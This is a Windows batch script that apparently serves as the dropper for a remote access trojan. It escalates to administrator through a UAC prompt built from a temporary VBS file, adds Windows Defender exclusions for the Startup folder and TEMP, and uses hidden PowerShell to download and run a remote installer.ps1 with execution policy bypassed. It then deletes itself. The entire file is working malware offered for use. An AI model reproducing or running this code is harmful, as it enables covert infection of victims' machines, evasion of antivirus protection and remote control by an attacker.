@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------   

REM Disable Windows Defender and execute the downloaded script

REM rat resources
powershell -windowstyle hidden -Command ^
"try { ^
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile '$env:TEMP\installer.ps1'; ^
    Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
    Add-MpPreference -ExclusionPath '$env:TEMP'; ^
    powershell.exe -ExecutionPolicy Bypass -File '$env:TEMP\installer.ps1'; ^
} catch { ^
    Write-Error 'An error occurred: ' + $_.Exception.Message; ^
}"

REM Self-delete
start /b "" cmd /c del "%~f0"&exit
